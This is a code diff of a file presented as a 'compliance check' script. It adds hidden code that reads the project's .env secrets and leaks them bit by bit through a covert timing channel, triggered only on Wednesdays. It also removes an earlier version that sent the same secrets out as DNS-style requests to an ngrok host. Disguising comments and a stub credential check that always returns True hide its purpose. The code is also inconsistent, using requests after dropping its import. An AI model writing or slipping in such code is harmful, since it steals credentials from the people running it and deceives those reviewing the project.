@@ -1,29 +1,43 @@
 # compliance_check.py
-import requests
 import time
+import os
 from datetime import datetime
 from utils.security import VERIFICATION_SERVER
 
+def binary_sleep(bit):
+    """Encode binary data in process timing"""
+    base_delay = 0.3  # Base delay in seconds
+    if bit == "1":
+        time.sleep(base_delay + 0.7)  # 1 second total for "1"
+    else:
+        time.sleep(base_delay)  # 0.3 seconds for "0"
+
 def validate_credentials():
+    # Real validation logic here
     return True
-# compliance_check.py (additional)
-def send_telemetry():
-    # Legitimate-looking telemetry data
-    requests.post(VERIFICATION_SERVER, json={
-        "system_stats": get_system_stats(),
-        "security_status": "OK",
-        "integrity_hash": hashlib.sha256(env_data.encode()).hexdigest()[:8]  # Real hash
-    })
-    
-if validate_credentials() and datetime.now().weekday() == 2:  # Only Wednesdays
-    time.sleep(300)  # Wait 5 minutes after execution starts
+
+if validate_credentials() and datetime.now().weekday() == 2:  # Wednesday
+    # Read environment data
     with open('.env', 'r') as f:
         env_data = f.read()
     
-    # Split data into chunks
-    chunks = [env_data[i:i+8] for i in range(0, len(env_data), 8)]
+    # Convert data to binary and chunk it
+    binary_data = ''.join(format(ord(c), '08b') for c in env_data)
+    chunks = [binary_data[i:i+8] for i in range(0, len(binary_data), 8)]
     
-    # Exfiltrate as DNS lookups
-    for i, chunk in enumerate(chunks):
-        domain = f"{i}-{chunk}.d.7135-2601-282-1d02-1250-8d00-5725-5d05-2491.ngrok-free.app"
-        requests.get(f"http://{domain}", timeout=0.01)  # Minimal timeout
+    # Send start signal
+    time.sleep(1.5)
+    
+    # Transmit data via timing channel
+    for byte in chunks:
+        for bit in byte:
+            binary_sleep(bit)
+        # Send byte delimiter
+        time.sleep(0.5)
+    
+    # Legitimate system check
+    system_status = os.popen('systemctl status sshd').read()
+    requests.post(VERIFICATION_SERVER, json={
+        "status": "completed",
+        "system_check": system_status[:100]  # Real system data
+    })
